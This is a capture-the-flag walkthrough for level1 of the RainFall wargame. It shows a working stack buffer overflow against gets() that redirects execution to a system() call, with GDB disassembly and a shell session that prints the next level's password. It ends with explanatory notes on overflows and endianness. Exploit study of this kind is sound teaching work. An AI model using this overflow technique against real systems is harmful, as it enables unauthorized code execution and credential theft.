# Walkthrough

## Solution
```
$ (python -c "print 'A' * 76 + '\x44\x84\x04\x08'" ; cat) | ./level1 
```

## Explanation

GDB:
info functions -> list all functions available

EIP: Instruction pointer, points to the next function to be executed

https://wiremask.eu/tools/buffer-overflow-pattern-generator/

```
(gdb) disas main
Dump of assembler code for function main:
   0x08048480 <+0>:	push   %ebp
   0x08048481 <+1>:	mov    %esp,%ebp
   0x08048483 <+3>:	and    $0xfffffff0,%esp
   0x08048486 <+6>:	sub    $0x50,%esp      // substract 80 from esp
   0x08048489 <+9>:	lea    0x10(%esp),%eax
   0x0804848d <+13>:	mov    %eax,(%esp)
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave  
   0x08048496 <+22>:	ret    
End of assembler dump.

(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482f8  _init
0x08048340  gets
0x08048340  gets@plt
0x08048350  fwrite
0x08048350  fwrite@plt
0x08048360  system
0x08048360  system@plt
0x08048370  __gmon_start__
0x08048370  __gmon_start__@plt
0x08048380  __libc_start_main
0x08048380  __libc_start_main@plt
0x08048390  _start
0x080483c0  __do_global_dtors_aux
0x08048420  frame_dummy
0x08048444  run
0x08048480  main
0x080484a0  __libc_csu_init
0x08048510  __libc_csu_fini
0x08048512  __i686.get_pc_thunk.bx
0x08048520  __do_global_ctors_aux

There is a run function.
(gdb) disas run
Dump of assembler code for function run:
   0x08048444 <+0>:	push   %ebp
   0x08048445 <+1>:	mov    %esp,%ebp
   0x08048447 <+3>:	sub    $0x18,%esp
   0x0804844a <+6>:	mov    0x80497c0,%eax
   0x0804844f <+11>:	mov    %eax,%edx
   0x08048451 <+13>:	mov    $0x8048570,%eax
   0x08048456 <+18>:	mov    %edx,0xc(%esp)
   0x0804845a <+22>:	movl   $0x13,0x8(%esp)
   0x08048462 <+30>:	movl   $0x1,0x4(%esp)
   0x0804846a <+38>:	mov    %eax,(%esp)
   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:	movl   $0x8048584,(%esp)
   0x08048479 <+53>:	call   0x8048360 <system@plt>
   0x0804847e <+58>:	leave  
   0x0804847f <+59>:	ret    
End of assembler dump.
```

We need to overflow the buffer, to overwrite EIP with the run function address.
With wiremask, we know that we segfault at character 76.
We are going to write 76 characters followed by the address of run.


python -c "print 'A' * 76 + '\x44\x84\x04\x08'" | ./level1
Good... Wait what?
Segmentation fault (core dumped)

We need to use cat, so that the program wait for an input from stdin
-------------------------------

level1@RainFall:~$ (python -c "print 'A' * 76 + '\x44\x84\x04\x08'" ; cat) | ./level1 
Good... Wait what?
ls
ls: cannot open directory .: Permission denied
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77








/*
Stack based buffer overflows are one of the most common vulnerabilities. Found today. It affects any
function that copies input to memory without doing bounds checking. For example:
Strcpy(),memcpy(),gets(),etc…..
What is a buffer overflow? A buffer overflow occurs when a function copies data into a buffer without
doing bounds checking. So if the source data size is larger than the destination buffer size this data will
overflow the buffer towards higher memory address and probably overwrite previous data on stack.


https://0xrick.github.io/binary-exploitation/bof3/

Transform the address to little endian because in general the stack goes from the top of the memory to the bottom,
thus the "data" you use is always written from low to high  
```
0A 0B 0C 0D
 |	|  |  |    Memory:
 | |  |   ---> 0D (a)
 | |   ------> 0C (a+1)
 |  ---------> 0B (a+2)
  -----------> 0A (a+3)
  Little endian
```

*/
